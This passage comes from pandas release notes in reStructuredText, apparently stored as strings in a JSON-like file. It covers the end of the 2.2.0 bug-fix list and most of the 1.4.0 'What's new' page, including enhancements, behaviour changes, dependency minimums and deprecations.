(:issue:`56703`)\n- Bug in :func:`cut` and :func:`qcut` with ``datetime64`` dtype values with non-nanosecond units incorrectly returning nanosecond-unit bins (:issue:`56101`)\n- Bug in :func:`cut` incorrectly allowing cutting of timezone-aware datetimes with timezone-naive bins (:issue:`54964`)\n- Bug in :func:`infer_freq` and :meth:`DatetimeIndex.inferred_freq` with weekly frequencies and non-nanosecond resolutions (:issue:`55609`)\n- Bug in :meth:`DataFrame.apply` where passing ``raw=True`` ignored ``args`` passed to the applied function (:issue:`55009`)\n- Bug in :meth:`DataFrame.from_dict` which would always sort the rows of the created :class:`DataFrame`.  (:issue:`55683`)\n- Bug in :meth:`DataFrame.sort_index` when passing ``axis=\"columns\"`` and ``ignore_index=True`` raising a ``ValueError`` (:issue:`56478`)\n- Bug in rendering ``inf`` values inside a :class:`DataFrame` with the ``use_inf_as_na`` option enabled (:issue:`55483`)\n- Bug in rendering a :class:`Series` with a :class:`MultiIndex` when one of the index level's names is 0 not having that name displayed (:issue:`55415`)\n- Bug in the error message when assigning an empty :class:`DataFrame` to a column (:issue:`55956`)\n- Bug when time-like strings were being cast to :class:`ArrowDtype` with ``pyarrow.time64`` type (:issue:`56463`)\n- Fixed a spurious deprecation warning from ``numba`` >= 0.58.0 when passing a numpy ufunc in :class:`core.window.Rolling.apply` with ``engine=\"numba\"`` (:issue:`55247`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_220.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v2.1.4..v2.2.0\n", "1.4.0": ".. _whatsnew_140:\n\nWhat's new in 1.4.0 (January 22, 2022)\n--------------------------------------\n\nThese are the changes in pandas 1.4.0. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_140.enhancements:\n\nEnhancements\n~~~~~~~~~~~~\n\n.. _whatsnew_140.enhancements.warning_lineno:\n\nImproved warning messages\n^^^^^^^^^^^^^^^^^^^^^^^^^\n\nPreviously, warning messages may have pointed to lines within the pandas\nlibrary. Running the script ``setting_with_copy_warning.py``\n\n.. code-block:: python\n\n    import pandas as pd\n\n    df = pd.DataFrame({'a': [1, 2, 3]})\n    df[:2].loc[:, 'a'] = 5\n\nwith pandas 1.3 resulted in::\n\n    .../site-packages/pandas/core/indexing.py:1951: SettingWithCopyWarning:\n    A value is trying to be set on a copy of a slice from a DataFrame.\n\nThis made it difficult to determine where the warning was being generated from.\nNow pandas will inspect the call stack, reporting the first line outside of the\npandas library that gave rise to the warning. The output of the above script is\nnow::\n\n    setting_with_copy_warning.py:4: SettingWithCopyWarning:\n    A value is trying to be set on a copy of a slice from a DataFrame.\n\n\n\n\n.. _whatsnew_140.enhancements.ExtensionIndex:\n\nIndex can hold arbitrary ExtensionArrays\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nUntil now, passing a custom :class:`ExtensionArray` to ``pd.Index`` would cast\nthe array to ``object`` dtype. Now :class:`Index` can directly hold arbitrary\nExtensionArrays (:issue:`43930`).\n\n*Previous behavior*:\n\n.. ipython:: python\n\n   arr = pd.array([1, 2, pd.NA])\n   idx = pd.Index(arr)\n\nIn the old behavior, ``idx`` would be object-dtype:\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n   In [1]: idx\n   Out[1]: Index([1, 2, <NA>], dtype='object')\n\nWith the new behavior, we keep the original dtype:\n\n*New behavior*:\n\n.. ipython:: python\n\n   idx\n\nOne exception to this is ``SparseArray``, which will continue to cast to numpy\ndtype until pandas 2.0. At that point it will retain its dtype like other\nExtensionArrays.\n\n.. _whatsnew_140.enhancements.styler:\n\nStyler\n^^^^^^\n\n:class:`.Styler` has been further developed in 1.4.0. The following general enhancements have been made:\n\n  - Styling and formatting of indexes has been added, with :meth:`.Styler.apply_index`, :meth:`.Styler.applymap_index` and :meth:`.Styler.format_index`. These mirror the signature of the methods already used to style and format data values, and work with both HTML, LaTeX and Excel format (:issue:`41893`, :issue:`43101`, :issue:`41993`, :issue:`41995`)\n  - The new method :meth:`.Styler.hide` deprecates :meth:`.Styler.hide_index` and :meth:`.Styler.hide_columns` (:issue:`43758`)\n  - The keyword arguments ``level`` and ``names`` have been added to :meth:`.Styler.hide` (and implicitly to the deprecated methods :meth:`.Styler.hide_index` and :meth:`.Styler.hide_columns`) for additional control of visibility of MultiIndexes and of Index names (:issue:`25475`, :issue:`43404`, :issue:`43346`)\n  - The :meth:`.Styler.export` and :meth:`.Styler.use` have been updated to address all of the added functionality from v1.2.0 and v1.3.0 (:issue:`40675`)\n  - Global options under the category ``pd.options.styler`` have been extended to configure default ``Styler`` properties which address formatting, encoding, and HTML and LaTeX rendering. Note that formerly ``Styler`` relied on ``display.html.use_mathjax``, which has now been replaced by ``styler.html.mathjax`` (:issue:`41395`)\n  - Validation of certain keyword arguments, e.g. ``caption`` (:issue:`43368`)\n  - Various bug fixes as recorded below\n\nAdditionally there are specific enhancements to the HTML specific rendering:\n\n  - :meth:`.Styler.bar` introduces additional arguments to control alignment and display (:issue:`26070`, :issue:`36419`), and it also validates the input arguments ``width`` and ``height`` (:issue:`42511`)\n  - :meth:`.Styler.to_html` introduces keyword arguments ``sparse_index``, ``sparse_columns``, ``bold_headers``, ``caption``, ``max_rows`` and ``max_columns`` (:issue:`41946`, :issue:`43149`, :issue:`42972`)\n  - :meth:`.Styler.to_html` omits CSSStyle rules for hidden table elements as a performance enhancement (:issue:`43619`)\n  - Custom CSS classes can now be directly specified without string replacement (:issue:`43686`)\n  - Ability to render hyperlinks automatically via a new ``hyperlinks`` formatting keyword argument (:issue:`45058`)\n\nThere are also some LaTeX specific enhancements:\n\n  - :meth:`.Styler.to_latex` introduces keyword argument ``environment``, which also allows a specific \"longtable\" entry through a separate jinja2 template (:issue:`41866`)\n  - Naive sparsification is now possible for LaTeX without the necessity of including the multirow package (:issue:`43369`)\n  - *cline* support has been added for :class:`MultiIndex` row sparsification through a keyword argument (:issue:`45138`)\n\n.. _whatsnew_140.enhancements.pyarrow_csv_engine:\n\nMulti-threaded CSV reading with a new CSV Engine based on pyarrow\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:func:`pandas.read_csv` now accepts ``engine=\"pyarrow\"`` (requires at least\n``pyarrow`` 1.0.1) as an argument, allowing for faster csv parsing on multicore\nmachines with pyarrow installed. See the :doc:`I/O docs </user_guide/io>` for\nmore info. (:issue:`23697`, :issue:`43706`)\n\n.. _whatsnew_140.enhancements.window_rank:\n\nRank function for rolling and expanding windows\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nAdded ``rank`` function to :class:`Rolling` and :class:`Expanding`. The new\nfunction supports the ``method``, ``ascending``, and ``pct`` flags of\n:meth:`DataFrame.rank`. The ``method`` argument supports ``min``, ``max``, and\n``average`` ranking methods.\nExample:\n\n.. ipython:: python\n\n    s = pd.Series([1, 4, 2, 3, 5, 3])\n    s.rolling(3).rank()\n\n    s.rolling(3).rank(method=\"max\")\n\n.. _whatsnew_140.enhancements.groupby_indexing:\n\nGroupby positional indexing\n^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nIt is now possible to specify positional ranges relative to the ends of each\ngroup.\n\nNegative arguments for :meth:`.DataFrameGroupBy.head`, :meth:`.SeriesGroupBy.head`, :meth:`.DataFrameGroupBy.tail`, and :meth:`.SeriesGroupBy.tail` now work\ncorrectly and result in ranges relative to the end and start of each group,\nrespectively. Previously, negative arguments returned empty frames.\n\n.. ipython:: python\n\n    df = pd.DataFrame([[\"g\", \"g0\"], [\"g\", \"g1\"], [\"g\", \"g2\"], [\"g\", \"g3\"],\n                       [\"h\", \"h0\"], [\"h\", \"h1\"]], columns=[\"A\", \"B\"])\n    df.groupby(\"A\").head(-1)\n\n\n:meth:`.DataFrameGroupBy.nth` and :meth:`.SeriesGroupBy.nth` now accept a slice or list of integers and slices.\n\n.. ipython:: python\n\n    df.groupby(\"A\").nth(slice(1, -1))\n    df.groupby(\"A\").nth([slice(None, 1), slice(-1, None)])\n\n:meth:`.DataFrameGroupBy.nth` and :meth:`.SeriesGroupBy.nth` now accept index notation.\n\n.. ipython:: python\n\n    df.groupby(\"A\").nth[1, -1]\n    df.groupby(\"A\").nth[1:-1]\n    df.groupby(\"A\").nth[:1, -1:]\n\n.. _whatsnew_140.dict_tight:\n\nDataFrame.from_dict and DataFrame.to_dict have new ``'tight'`` option\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nA new ``'tight'`` dictionary format that preserves :class:`MultiIndex` entries\nand names is now available with the :meth:`DataFrame.from_dict` and\n:meth:`DataFrame.to_dict` methods and can be used with the standard ``json``\nlibrary to produce a tight representation of :class:`DataFrame` objects\n(:issue:`4889`).\n\n.. ipython:: python\n\n    df = pd.DataFrame.from_records(\n        [[1, 3], [2, 4]],\n        index=pd.MultiIndex.from_tuples([(\"a\", \"b\"), (\"a\", \"c\")],\n                                        names=[\"n1\", \"n2\"]),\n        columns=pd.MultiIndex.from_tuples([(\"x\", 1), (\"y\", 2)],\n                                          names=[\"z1\", \"z2\"]),\n    )\n    df\n    df.to_dict(orient='tight')\n\n.. _whatsnew_140.enhancements.other:\n\nOther enhancements\n^^^^^^^^^^^^^^^^^^\n- :meth:`concat` will preserve the ``attrs`` when it is the same for all objects and discard the ``attrs`` when they are different (:issue:`41828`)\n- :class:`DataFrameGroupBy` operations with ``as_index=False`` now correctly retain ``ExtensionDtype`` dtypes for columns being grouped on (:issue:`41373`)\n- Add support for assigning values to ``by`` argument in :meth:`DataFrame.plot.hist` and :meth:`DataFrame.plot.box` (:issue:`15079`)\n- :meth:`Series.sample`, :meth:`DataFrame.sample`, :meth:`.DataFrameGroupBy.sample`, and :meth:`.SeriesGroupBy.sample` now accept a ``np.random.Generator`` as input to ``random_state``. A generator will be more performant, especially with ``replace=False`` (:issue:`38100`)\n- :meth:`Series.ewm` and :meth:`DataFrame.ewm` now support a ``method`` argument with a ``'table'`` option that performs the windowing operation over an entire :class:`DataFrame`. See :ref:`Window Overview <window.overview>` for performance and functional benefits (:issue:`42273`)\n- :meth:`.DataFrameGroupBy.cummin`, :meth:`.SeriesGroupBy.cummin`, :meth:`.DataFrameGroupBy.cummax`, and :meth:`.SeriesGroupBy.cummax` now support the argument ``skipna`` (:issue:`34047`)\n- :meth:`read_table` now supports the argument ``storage_options`` (:issue:`39167`)\n- :meth:`DataFrame.to_stata` and :meth:`StataWriter` now accept the keyword only argument ``value_labels`` to save labels for non-categorical columns (:issue:`38454`)\n- Methods that relied on hashmap based algos such as :meth:`DataFrameGroupBy.value_counts`, :meth:`DataFrameGroupBy.count` and :func:`factorize` ignored imaginary component for complex numbers (:issue:`17927`)\n- Add :meth:`Series.str.removeprefix` and :meth:`Series.str.removesuffix` introduced in Python 3.9 to remove pre-/suffixes from string-type :class:`Series` (:issue:`36944`)\n- Attempting to write into a file in missing parent directory with :meth:`DataFrame.to_csv`, :meth:`DataFrame.to_html`, :meth:`DataFrame.to_excel`, :meth:`DataFrame.to_feather`, :meth:`DataFrame.to_parquet`, :meth:`DataFrame.to_stata`, :meth:`DataFrame.to_json`, :meth:`DataFrame.to_pickle`, and :meth:`DataFrame.to_xml` now explicitly mentions missing parent directory, the same is true for :class:`Series` counterparts (:issue:`24306`)\n- Indexing with ``.loc`` and ``.iloc`` now supports ``Ellipsis`` (:issue:`37750`)\n- :meth:`IntegerArray.all` , :meth:`IntegerArray.any`, :meth:`FloatingArray.any`, and :meth:`FloatingArray.all` use Kleene logic (:issue:`41967`)\n- Added support for nullable boolean and integer types in :meth:`DataFrame.to_stata`, :class:`~pandas.io.stata.StataWriter`, :class:`~pandas.io.stata.StataWriter117`, and :class:`~pandas.io.stata.StataWriterUTF8` (:issue:`40855`)\n- :meth:`DataFrame.__pos__` and :meth:`DataFrame.__neg__` now retain ``ExtensionDtype`` dtypes (:issue:`43883`)\n- The error raised when an optional dependency can't be imported now includes the original exception, for easier investigation (:issue:`43882`)\n- Added :meth:`.ExponentialMovingWindow.sum` (:issue:`13297`)\n- :meth:`Series.str.split` now supports a ``regex`` argument that explicitly specifies whether the pattern is a regular expression. Default is ``None`` (:issue:`43563`, :issue:`32835`, :issue:`25549`)\n- :meth:`DataFrame.dropna` now accepts a single label as ``subset`` along with array-like (:issue:`41021`)\n- Added :meth:`DataFrameGroupBy.value_counts` (:issue:`43564`)\n- :func:`read_csv` now accepts a ``callable`` function in ``on_bad_lines`` when ``engine=\"python\"`` for custom handling of bad lines (:issue:`5686`)\n- :class:`ExcelWriter` argument ``if_sheet_exists=\"overlay\"`` option added (:issue:`40231`)\n- :meth:`read_excel` now accepts a ``decimal`` argument that allow the user to specify the decimal point when parsing string columns to numeric (:issue:`14403`)\n- :meth:`.DataFrameGroupBy.mean`, :meth:`.SeriesGroupBy.mean`, :meth:`.DataFrameGroupBy.std`, :meth:`.SeriesGroupBy.std`, :meth:`.DataFrameGroupBy.var`, :meth:`.SeriesGroupBy.var`, :meth:`.DataFrameGroupBy.sum`, and :meth:`.SeriesGroupBy.sum` now support `Numba <http://numba.pydata.org/>`_ execution with the ``engine`` keyword (:issue:`43731`, :issue:`44862`, :issue:`44939`)\n- :meth:`Timestamp.isoformat` now handles the ``timespec`` argument from the base ``datetime`` class (:issue:`26131`)\n- :meth:`NaT.to_numpy` ``dtype`` argument is now respected, so ``np.timedelta64`` can be returned (:issue:`44460`)\n- New option ``display.max_dir_items`` customizes the number of columns added to :meth:`Dataframe.__dir__` and suggested for tab completion (:issue:`37996`)\n- Added \"Juneteenth National Independence Day\" to ``USFederalHolidayCalendar`` (:issue:`44574`)\n- :meth:`.Rolling.var`, :meth:`.Expanding.var`, :meth:`.Rolling.std`, and :meth:`.Expanding.std` now support `Numba <http://numba.pydata.org/>`_ execution with the ``engine`` keyword (:issue:`44461`)\n- :meth:`Series.info` has been added, for compatibility with :meth:`DataFrame.info` (:issue:`5167`)\n- Implemented :meth:`IntervalArray.min` and :meth:`IntervalArray.max`, as a result of which ``min`` and ``max`` now work for :class:`IntervalIndex`, :class:`Series` and :class:`DataFrame` with ``IntervalDtype`` (:issue:`44746`)\n- :meth:`UInt64Index.map` now retains ``dtype`` where possible (:issue:`44609`)\n- :meth:`read_json` can now parse unsigned long long integers (:issue:`26068`)\n- :meth:`DataFrame.take` now raises a ``TypeError`` when passed a scalar for the indexer (:issue:`42875`)\n- :meth:`is_list_like` now identifies duck-arrays as list-like unless ``.ndim == 0`` (:issue:`35131`)\n- :class:`ExtensionDtype` and :class:`ExtensionArray` are now (de)serialized when exporting a :class:`DataFrame` with :meth:`DataFrame.to_json` using ``orient='table'`` (:issue:`20612`, :issue:`44705`)\n- Add support for `Zstandard <http://facebook.github.io/zstd/>`_ compression to :meth:`DataFrame.to_pickle`/:meth:`read_pickle` and friends (:issue:`43925`)\n- :meth:`DataFrame.to_sql` now returns an ``int`` of the number of written rows (:issue:`23998`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_140.notable_bug_fixes:\n\nNotable bug fixes\n~~~~~~~~~~~~~~~~~\n\nThese are bug fixes that might have notable behavior changes.\n\n.. _whatsnew_140.notable_bug_fixes.inconsistent_date_string_parsing:\n\nInconsistent date string parsing\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThe ``dayfirst`` option of :func:`to_datetime` isn't strict, and this can lead\nto surprising behavior:\n\n.. ipython:: python\n    :okwarning:\n\n    pd.to_datetime([\"31-12-2021\"], dayfirst=False)\n\nNow, a warning will be raised if a date string cannot be parsed accordance to\nthe given ``dayfirst`` value when the value is a delimited date string (e.g.\n``31-12-2012``).\n\n.. _whatsnew_140.notable_bug_fixes.concat_with_empty_or_all_na:\n\nIgnoring dtypes in concat with empty or all-NA columns\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n.. note::\n    This behaviour change has been reverted in pandas 1.4.3.\n\nWhen using :func:`concat` to concatenate two or more :class:`DataFrame` objects,\nif one of the DataFrames was empty or had all-NA values, its dtype was\n*sometimes* ignored when finding the concatenated dtype.  These are now\nconsistently *not* ignored (:issue:`43507`).\n\n.. code-block:: ipython\n\n    In [3]: df1 = pd.DataFrame({\"bar\": [pd.Timestamp(\"2013-01-01\")]}, index=range(1))\n    In [4]: df2 = pd.DataFrame({\"bar\": np.nan}, index=range(1, 2))\n    In [5]: res = pd.concat([df1, df2])\n\nPreviously, the float-dtype in ``df2`` would be ignored so the result dtype\nwould be ``datetime64[ns]``. As a result, the ``np.nan`` would be cast to\n``NaT``.\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n    In [6]: res\n    Out[6]:\n             bar\n    0 2013-01-01\n    1        NaT\n\nNow the float-dtype is respected. Since the common dtype for these DataFrames is\nobject, the ``np.nan`` is retained.\n\n*New behavior*:\n\n.. code-block:: ipython\n\n    In [6]: res\n    Out[6]:\n                       bar\n    0  2013-01-01 00:00:00\n    1                  NaN\n\n\n\n.. _whatsnew_140.notable_bug_fixes.value_counts_and_mode_do_not_coerce_to_nan:\n\nNull-values are no longer coerced to NaN-value in value_counts and mode\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:meth:`Series.value_counts` and :meth:`Series.mode` no longer coerce ``None``,\n``NaT`` and other null-values to a NaN-value for ``np.object_``-dtype. This\nbehavior is now consistent with ``unique``, ``isin`` and others\n(:issue:`42688`).\n\n.. ipython:: python\n\n    s = pd.Series([True, None, pd.NaT, None, pd.NaT, None])\n    res = s.value_counts(dropna=False)\n\nPreviously, all null-values were replaced by a NaN-value.\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n    In [3]: res\n    Out[3]:\n    NaN     5\n    True    1\n    dtype: int64\n\nNow null-values are no longer mangled.\n\n*New behavior*:\n\n.. ipython:: python\n\n    res\n\n.. _whatsnew_140.notable_bug_fixes.read_csv_mangle_dup_cols:\n\nmangle_dupe_cols in read_csv no longer renames unique columns conflicting with target names\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:func:`read_csv` no longer renames unique column labels which conflict with the target\nnames of duplicated columns. Already existing columns are skipped, i.e. the next\navailable index is used for the target column name (:issue:`14704`).\n\n.. ipython:: python\n\n    import io\n\n    data = \"a,a,a.1\\n1,2,3\"\n    res = pd.read_csv(io.StringIO(data))\n\nPreviously, the second column was called ``a.1``, while the third column was\nalso renamed to ``a.1.1``.\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n    In [3]: res\n    Out[3]:\n        a  a.1  a.1.1\n    0   1    2      3\n\nNow the renaming checks if ``a.1`` already exists when changing the name of the\nsecond column and jumps this index. The second column is instead renamed to\n``a.2``.\n\n*New behavior*:\n\n.. ipython:: python\n\n    res\n\n.. _whatsnew_140.notable_bug_fixes.unstack_pivot_int32_limit:\n\nunstack and pivot_table no longer raises ValueError for result that would exceed int32 limit\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nPreviously :meth:`DataFrame.pivot_table` and :meth:`DataFrame.unstack` would\nraise a ``ValueError`` if the operation could produce a result with more than\n``2**31 - 1`` elements. This operation now raises a\n:class:`errors.PerformanceWarning` instead (:issue:`26314`).\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n    In [3]: df = DataFrame({\"ind1\": np.arange(2 ** 16), \"ind2\": np.arange(2 ** 16), \"count\": 0})\n    In [4]: df.pivot_table(index=\"ind1\", columns=\"ind2\", values=\"count\", aggfunc=\"count\")\n    ValueError: Unstacked DataFrame is too big, causing int32 overflow\n\n*New behavior*:\n\n.. code-block:: python\n\n    In [4]: df.pivot_table(index=\"ind1\", columns=\"ind2\", values=\"count\", aggfunc=\"count\")\n    PerformanceWarning: The following operation may generate 4294967296 cells in the resulting pandas object.\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_140.notable_bug_fixes.groupby_apply_mutation:\n\ngroupby.apply consistent transform detection\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:meth:`.DataFrameGroupBy.apply` and :meth:`.SeriesGroupBy.apply` are designed to be flexible, allowing users to perform\naggregations, transformations, filters, and use it with user-defined functions\nthat might not fall into any of these categories. As part of this, apply will\nattempt to detect when an operation is a transform, and in such a case, the\nresult will have the same index as the input. In order to determine if the\noperation is a transform, pandas compares the input's index to the result's and\ndetermines if it has been mutated. Previously in pandas 1.3, different code\npaths used different definitions of \"mutated\": some would use Python's ``is``\nwhereas others would test only up to equality.\n\nThis inconsistency has been removed, pandas now tests up to equality.\n\n.. ipython:: python\n\n    def func(x):\n        return x.copy()\n\n    df = pd.DataFrame({'a': [1, 2], 'b': [3, 4], 'c': [5, 6]})\n    df\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n    In [3]: df.groupby(['a']).apply(func)\n    Out[3]:\n         a  b  c\n    a\n    1 0  1  3  5\n    2 1  2  4  6\n\n    In [4]: df.set_index(['a', 'b']).groupby(['a']).apply(func)\n    Out[4]:\n         c\n    a b\n    1 3  5\n    2 4  6\n\nIn the examples above, the first uses a code path where pandas uses ``is`` and\ndetermines that ``func`` is not a transform whereas the second tests up to\nequality and determines that ``func`` is a transform. In the first case, the\nresult's index is not the same as the input's.\n\n*New behavior*:\n\n.. code-block:: ipython\n\n    In [5]: df.groupby(['a']).apply(func)\n    Out[5]:\n       a  b  c\n    0  1  3  5\n    1  2  4  6\n\n    In [6]: df.set_index(['a', 'b']).groupby(['a']).apply(func)\n    Out[6]:\n         c\n    a b\n    1 3  5\n    2 4  6\n\nNow in both cases it is determined that ``func`` is a transform. In each case,\nthe result has the same index as the input.\n\n.. _whatsnew_140.api_breaking:\n\nBackwards incompatible API changes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n.. _whatsnew_140.api_breaking.python:\n\nIncreased minimum version for Python\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\npandas 1.4.0 supports Python 3.8 and higher.\n\n.. _whatsnew_140.api_breaking.deps:\n\nIncreased minimum versions for dependencies\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nSome minimum supported versions of dependencies were updated.\nIf installed, we now require:\n\n+-----------------+-----------------+----------+---------+\n| Package         | Minimum Version | Required | Changed |\n+=================+=================+==========+=========+\n| numpy           | 1.18.5          |    X     |    X    |\n+-----------------+-----------------+----------+---------+\n| pytz            | 2020.1          |    X     |    X    |\n+-----------------+-----------------+----------+---------+\n| python-dateutil | 2.8.1           |    X     |    X    |\n+-----------------+-----------------+----------+---------+\n| bottleneck      | 1.3.1           |          |    X    |\n+-----------------+-----------------+----------+---------+\n| numexpr         | 2.7.1           |          |    X    |\n+-----------------+-----------------+----------+---------+\n| pytest (dev)    | 6.0             |          |         |\n+-----------------+-----------------+----------+---------+\n| mypy (dev)      | 0.930           |          |    X    |\n+-----------------+-----------------+----------+---------+\n\nFor `optional libraries\n<https://pandas.pydata.org/docs/getting_started/install.html>`_ the general\nrecommendation is to use the latest version. The following table lists the\nlowest version per library that is currently being tested throughout the\ndevelopment of pandas. Optional libraries below the lowest tested version may\nstill work, but are not considered supported.\n\n+-----------------+-----------------+---------+\n| Package         | Minimum Version | Changed |\n+=================+=================+=========+\n| beautifulsoup4  | 4.8.2           |    X    |\n+-----------------+-----------------+---------+\n| fastparquet     | 0.4.0           |         |\n+-----------------+-----------------+---------+\n| fsspec          | 0.7.4           |         |\n+-----------------+-----------------+---------+\n| gcsfs           | 0.6.0           |         |\n+-----------------+-----------------+---------+\n| lxml            | 4.5.0           |    X    |\n+-----------------+-----------------+---------+\n| matplotlib      | 3.3.2           |    X    |\n+-----------------+-----------------+---------+\n| numba           | 0.50.1          |    X    |\n+-----------------+-----------------+---------+\n| openpyxl        | 3.0.3           |    X    |\n+-----------------+-----------------+---------+\n| pandas-gbq      | 0.14.0          |    X    |\n+-----------------+-----------------+---------+\n| pyarrow         | 1.0.1           |    X    |\n+-----------------+-----------------+---------+\n| pymysql         | 0.10.1          |    X    |\n+-----------------+-----------------+---------+\n| pytables        | 3.6.1           |    X    |\n+-----------------+-----------------+---------+\n| s3fs            | 0.4.0           |         |\n+-----------------+-----------------+---------+\n| scipy           | 1.4.1           |    X    |\n+-----------------+-----------------+---------+\n| sqlalchemy      | 1.4.0           |    X    |\n+-----------------+-----------------+---------+\n| tabulate        | 0.8.7           |         |\n+-----------------+-----------------+---------+\n| xarray          | 0.15.1          |    X    |\n+-----------------+-----------------+---------+\n| xlrd            | 2.0.1           |    X    |\n+-----------------+-----------------+---------+\n| xlsxwriter      | 1.2.2           |    X    |\n+-----------------+-----------------+---------+\n| xlwt            | 1.3.0           |         |\n+-----------------+-----------------+---------+\n\nSee :ref:`install.dependencies` and :ref:`install.optional_dependencies` for more.\n\n.. _whatsnew_140.api_breaking.other:\n\nOther API changes\n^^^^^^^^^^^^^^^^^\n- :meth:`Index.get_indexer_for` no longer accepts keyword arguments (other than ``target``); in the past these would be silently ignored if the index was not unique (:issue:`42310`)\n- Change in the position of the ``min_rows`` argument in :meth:`DataFrame.to_string` due to change in the docstring (:issue:`44304`)\n- Reduction operations for :class:`DataFrame` or :class:`Series` now raising a ``ValueError`` when ``None`` is passed for ``skipna`` (:issue:`44178`)\n- :func:`read_csv` and :func:`read_html` no longer raising an error when one of the header rows consists only of ``Unnamed:`` columns (:issue:`13054`)\n- Changed the ``name`` attribute of several holidays in\n  ``USFederalHolidayCalendar`` to match `official federal holiday\n  names <https://www.opm.gov/policy-data-oversight/pay-leave/federal-holidays/>`_\n  specifically:\n\n   - \"New Year's Day\" gains the possessive apostrophe\n   - \"Presidents Day\" becomes \"Washington's Birthday\"\n   - \"Martin Luther King Jr. Day\" is now \"Birthday of Martin Luther King, Jr.\"\n   - \"July 4th\" is now \"Independence Day\"\n   - \"Thanksgiving\" is now \"Thanksgiving Day\"\n   - \"Christmas\" is now \"Christmas Day\"\n   - Added \"Juneteenth National Independence Day\"\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_140.deprecations:\n\nDeprecations\n~~~~~~~~~~~~\n\n.. _whatsnew_140.deprecations.int64_uint64_float64index:\n\nDeprecated Int64Index, UInt64Index & Float64Index\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:class:`Int64Index`, :class:`UInt64Index` and :class:`Float64Index` have been\ndeprecated in favor of the base :class:`Index` class and will be removed in\nPandas 2.0 (:issue:`43028`).\n\nFor constructing a numeric index, you can use the base :class:`Index` class\ninstead specifying the data type (which will also work on older pandas\nreleases):\n\n.. code-block:: python\n\n    # replace\n    pd.Int64Index([1, 2, 3])\n    # with\n    pd.Index([1, 2, 3], dtype=\"int64\")\n\nFor checking the data type of an index object, you can replace ``isinstance``\nchecks with checking the ``dtype``:\n\n.. code-block:: python\n\n    # replace\n    isinstance(idx, pd.Int64Index)\n    # with\n    idx.dtype == \"int64\"\n\nCurrently, in order to maintain backward compatibility, calls to :class:`Index`\nwill continue to return :class:`Int64Index`, :class:`UInt64Index` and\n:class:`Float64Index` when given numeric data, but in the future, an\n:class:`Index` will be returned.\n\n*Current behavior*:\n\n.. code-block:: ipython\n\n    In [1]: pd.Index([1, 2, 3], dtype=\"int32\")\n    Out [1]: Int64Index([1, 2, 3], dtype='int64')\n    In [1]: pd.Index([1, 2, 3], dtype=\"uint64\")\n    Out [1]: UInt64Index([1, 2, 3], dtype='uint64')\n\n*Future behavior*:\n\n.. code-block:: ipython\n\n    In [3]: pd.Index([1, 2, 3], dtype=\"int32\")\n    Out [3]: Index([1, 2, 3], dtype='int32')\n    In [4]: pd.Index([1, 2, 3], dtype=\"uint64\")\n    Out [4]: Index([1, 2, 3], dtype='uint64')\n\n\n.. _whatsnew_140.deprecations.frame_series_append:\n\nDeprecated DataFrame.append and Series.append\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:meth:`DataFrame.append` and :meth:`Series.append` have been deprecated and will\nbe removed in a future version. Use :func:`pandas.concat` instead (:issue:`35407`).\n\n*Deprecated syntax*\n\n.. code-block:: ipython\n\n    In [1]: pd.Series([1, 2]).append(pd.Series([3, 4])\n    Out [1]:\n    <stdin>:1: FutureWarning: The series.append method is deprecated and will be removed from pandas in a future version. Use pandas.concat instead.\n    0    1\n    1    2\n    0    3\n    1    4\n    dtype: int64\n\n    In [2]: df1 = pd.DataFrame([[1, 2], [3, 4]], columns=list('AB'))\n    In [3]: df2 = pd.DataFrame([[5, 6], [7, 8]], columns=list('AB'))\n    In [4]: df1.append(df2)\n    Out [4]:\n    <stdin>:1: FutureWarning: The series.append method is deprecated and will be removed from pandas in a future version. Use pandas.concat instead.\n       A  B\n    0  1  2\n    1  3  4\n    0  5  6\n    1  7  8\n\n*Recommended syntax*\n\n.. ipython:: python\n\n    pd.concat([pd.Series([1, 2]), pd.Series([3, 4])])\n\n    df1 = pd.DataFrame([[1, 2], [3, 4]], columns=list('AB'))\n    df2 = pd.DataFrame([[5, 6], [7, 8]], columns=list('AB'))\n    pd.concat([df1, df2])\n\n\n.. _whatsnew_140.deprecations.other:\n\nOther Deprecations\n^^^^^^^^^^^^^^^^^^\n- Deprecated 